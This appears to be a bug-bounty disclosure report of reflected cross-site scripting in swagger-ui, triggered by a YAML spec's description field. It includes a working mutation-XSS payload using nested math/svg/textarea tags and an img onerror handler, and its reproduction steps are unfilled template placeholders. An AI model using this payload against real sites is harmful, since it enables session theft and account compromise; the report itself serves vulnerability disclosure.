## Summary:
Hi team, It was found xss reflected on swagger api

swagger-ui is a library that allows interaction and visualisation of APIs.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS). It is possible to execute JavaScript by providing a YAML file with a description field. Any YAML file can trigger the vulnerability, whether it's imported from url or copied and pasted directly in the editor.

**Note when providing a YAML, in order to achieve xss, it can be used the following template:**

```
swagger: '2.0'
info:
  title: Example yaml.spec
  description: |
    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
paths:
  /accounts:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      operationId: findAccounts
      summary: Finds all accounts
```

## Steps To Reproduce:

  1. Access the url `{{data}}`
  2. See the pupup in the screen

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

* An attacker that can control the code executed in a victim browser can usually fully compromise this victim. This includes :
* Perform any action within the application that the user can perform.
* Modify any information that the user is able to modify.
* Steal user cookies
* Redirect to phishing site
